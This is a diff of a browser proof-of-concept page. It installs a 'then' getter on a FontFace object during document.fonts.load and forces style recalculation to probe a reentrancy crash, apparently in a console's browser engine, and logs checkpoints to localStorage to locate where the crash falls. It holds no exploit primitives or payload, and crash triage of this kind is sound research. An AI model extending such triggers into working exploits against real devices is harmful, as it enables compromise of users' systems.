@@ -1,10 +1,9 @@
 <!doctype html>
-
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CSSFontFace own-local hardmark diagnostic</title>
+<title>CSSFontFace own-local offsetTop-only diagnostic</title>
 <style>
 html {
     font-family: system-ui, -apple-system, sans-serif;
@@ -47,9 +46,10 @@ body {
 </style>
 </head>
 <body>
-<h1>CSSFontFace own-local hardmark diagnostic</h1>
+<h1>CSSFontFace own-local offsetTop-only diagnostic</h1>
 <div class="box warn">
-Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP, no sandbox escape.
+Diagnostic-only. No heap spray, no exploit primitives, no ARW/addrof/fakeobj,
+no shellcode, no ROP/JOP, no sandbox escape.
 </div>
 <div class="box">
     <div id="stage">Stage: not started</div>
@@ -70,7 +70,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         testRunner.dumpAsText();
         testRunner.waitUntilDone();
     }
-    const STORAGE_KEY = "cssfontface-own-local-hardmark-log";
+    const STORAGE_KEY = "cssfontface-own-local-offsettop-only-log";
     const LAST_KEY = STORAGE_KEY + "-last";
     const stageElement = document.getElementById("stage");
     const logElement = document.getElementById("log");
@@ -101,7 +101,10 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
     function log(msg) {
         hardMark("log entered: " + msg);
         const line = "[" + (++seq) + "] " + now() + " :: " + msg;
-        logElement.textContent += line + "\n";
+        try {
+            logElement.textContent += line + "\n";
+        } catch (e) {
+        }
         persist(line);
         try {
             console.log(line);
@@ -110,7 +113,10 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
     }
     function stage(msg) {
         hardMark("stage entered: " + msg);
-        stageElement.textContent = "Stage: " + msg;
+        try {
+            stageElement.textContent = "Stage: " + msg;
+        } catch (e) {
+        }
         log("STAGE => " + msg);
     }
     function finish() {
@@ -187,7 +193,6 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         hardMark("cleanup exit");
     }
     function cssRuleCount(styleElement) {
-        hardMark("cssRuleCount entered");
         try {
             if (!styleElement || !styleElement.sheet)
                 return "no-sheet";
@@ -196,15 +201,11 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             return "throws:" + e.name;
         }
     }
-    function makeStyle(family, cssVariant) {
+    function makeStyle(family) {
         hardMark("makeStyle entered");
         const style = document.createElement("style");
         style.setAttribute("data-validation-style", "1");
-        let src;
-        if (cssVariant === "missing")
-            src = 'url("missing-font-' + runCounter + '.woff") format("woff")';
-        else
-            src = 'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")';
+        const src = 'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")';
         style.textContent =
             '@font-face {\n' +
             '    font-family: "' + family + '";\n' +
@@ -216,45 +217,27 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         hardMark("makeStyle: after appendChild");
         return style;
     }
+    /*
+     * This is the key isolation:
+     * only body.offsetTop is used.
+     * No probe.offsetWidth.
+     * No getComputedStyle.
+     */
     function forceStyleRecalc(label) {
         hardMark("forceStyleRecalc entered: " + label);
         log("MARK: ENTER forceStyleRecalc " + label);
-        stage(label + " forceStyleRecalc body.offsetTop ENTER");
-        log("MARK: before body.offsetTop");
+        stage(label + " body.offsetTop ONLY ENTER");
+        log("MARK: before body.offsetTop ONLY");
         try {
-            hardMark("before body.offsetTop");
+            hardMark("before body.offsetTop ONLY");
             const a = document.body.offsetTop;
-            hardMark("after body.offsetTop");
-            log(label + ": body.offsetTop=" + a);
+            hardMark("after body.offsetTop ONLY");
+            log(label + ": body.offsetTop ONLY=" + a);
         } catch (e) {
-            log(label + ": body.offsetTop threw: " + e.name + ": " + e.message);
+            log(label + ": body.offsetTop ONLY threw: " + e.name + ": " + e.message);
         }
-        log("MARK: after body.offsetTop");
-        stage(label + " forceStyleRecalc body.offsetTop EXIT");
-        stage(label + " forceStyleRecalc probe.offsetWidth ENTER");
-        log("MARK: before probe.offsetWidth");
-        try {
-            hardMark("before probe.offsetWidth");
-            const b = probe.offsetWidth;
-            hardMark("after probe.offsetWidth");
-            log(label + ": probe.offsetWidth=" + b);
-        } catch (e) {
-            log(label + ": probe.offsetWidth threw: " + e.name + ": " + e.message);
-        }
-        log("MARK: after probe.offsetWidth");
-        stage(label + " forceStyleRecalc probe.offsetWidth EXIT");
-        stage(label + " forceStyleRecalc getComputedStyle ENTER");
-        log("MARK: before getComputedStyle(probe).fontFamily");
-        try {
-            hardMark("before getComputedStyle(probe).fontFamily");
-            const c = getComputedStyle(probe).fontFamily;
-            hardMark("after getComputedStyle(probe).fontFamily");
-            log(label + ": fontFamily=" + c);
-        } catch (e) {
-            log(label + ": getComputedStyle threw: " + e.name + ": " + e.message);
-        }
-        log("MARK: after getComputedStyle(probe).fontFamily");
-        stage(label + " forceStyleRecalc getComputedStyle EXIT");
+        log("MARK: after body.offsetTop ONLY");
+        stage(label + " body.offsetTop ONLY EXIT");
         log("MARK: EXIT forceStyleRecalc " + label);
         hardMark("forceStyleRecalc exit: " + label);
     }
@@ -372,8 +355,8 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         hardMark("createJSFace exit");
         return face;
     }
-    async function runDocumentFontsLoad(getterMode, cssVariant) {
-        hardMark("runDocumentFontsLoad entered: " + getterMode + "/" + cssVariant);
+    async function runDocumentFontsLoad() {
+        hardMark("runDocumentFontsLoad entered: own/local");
         cleanup();
         hardMark("after cleanup");
         runCounter++;
@@ -388,6 +371,8 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             log("document.fonts is not available");
             return;
         }
+        const getterMode = "own";
+        const cssVariant = "local";
         const family = "ps5-reentry-" + getterMode + "-" + cssVariant + "-" + Date.now() + "-" + runCounter;
         hardMark("before makeStyle");
         const styleElement = makeStyle(family);
@@ -403,35 +388,22 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             reentered: false,
             reentryCount: 0
         };
-        stage("setup " + getterMode + " + " + cssVariant);
+        stage("setup own + local");
         log("family=" + family);
         log("initial cssRules=" + cssRuleCount(styleElement));
         log("initial document.fonts.size=" + document.fonts.size);
-        let oldProtoDesc = null;
-        let protoChanged = false;
         try {
-            if (getterMode === "prototype") {
-                oldProtoDesc = Object.getOwnPropertyDescriptor(FontFace.prototype, "then");
-                Object.defineProperty(FontFace.prototype, "then", {
-                    configurable: true,
-                    get: makeThenGetter("FontFace.prototype.then")
-                });
-                protoChanged = true;
-                log("installed getter on FontFace.prototype.then");
-            }
             hardMark("before createJSFace");
             const jsFace = createJSFace(family);
             hardMark("after createJSFace");
             log("created JS FontFace; status=" + jsFace.status);
-            if (getterMode === "own") {
-                hardMark("before define own jsFace.then");
-                Object.defineProperty(jsFace, "then", {
-                    configurable: true,
-                    get: makeThenGetter("jsFace.then")
-                });
-                hardMark("after define own jsFace.then");
-                log("installed own getter on jsFace.then");
-            }
+            hardMark("before define own jsFace.then");
+            Object.defineProperty(jsFace, "then", {
+                configurable: true,
+                get: makeThenGetter("jsFace.then")
+            });
+            hardMark("after define own jsFace.then");
+            log("installed own getter on jsFace.then");
             log('"then" in jsFace = ' + ("then" in jsFace));
             log("own then descriptor exists = " + !!Object.getOwnPropertyDescriptor(jsFace, "then"));
             log("prototype then descriptor exists = " + !!Object.getOwnPropertyDescriptor(FontFace.prototype, "then"));
@@ -495,38 +467,21 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
                 log("stack: " + e.stack);
         } finally {
             active.armed = false;
-            if (protoChanged) {
-                try {
-                    if (oldProtoDesc)
-                        Object.defineProperty(FontFace.prototype, "then", oldProtoDesc);
-                    else
-                        delete FontFace.prototype.then;
-                    log("restored FontFace.prototype.then");
-                } catch (e) {
-                    log("failed to restore FontFace.prototype.then: " + e.name + ": " + e.message);
-                }
-            }
         }
     }
     async function runAll() {
         hardMark("runAll entered");
         loadPrevious();
-        /*
-         * Important:
-         * Do not clear LAST_KEY before the run.
-         * If the page crashes early, LAST CHECKPOINT should still show where it stopped.
-         * We only clear the full log, not the last checkpoint.
-         */
         try {
             localStorage.removeItem(STORAGE_KEY);
         } catch (e) {
         }
         hardMark("after full log clear");
-        log("POC STARTED: CSSFontFace own-local only hardmark diagnostic");
+        log("POC STARTED: CSSFontFace own-local offsetTop-only diagnostic");
         hardMark("before stage own-local only");
         stage("auto sequence starting: own + local only");
         hardMark("before runDocumentFontsLoad own/local");
-        await runDocumentFontsLoad("own", "local");
+        await runDocumentFontsLoad();
         hardMark("after runDocumentFontsLoad own/local");
         await sleep(100);
         stage("auto sequence complete");
